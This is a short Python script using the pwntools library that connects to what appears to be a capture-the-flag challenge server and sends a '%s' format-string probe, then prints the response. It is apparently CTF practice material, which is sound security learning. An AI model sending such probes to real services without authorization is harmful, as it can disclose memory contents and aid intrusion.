#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"

HOST, PORT = "chal.sigpwny.com", 1338

io = remote(HOST, PORT)

io.sendline(b"%s")
res = io.recvall(timeout=2)
print(res.decode())
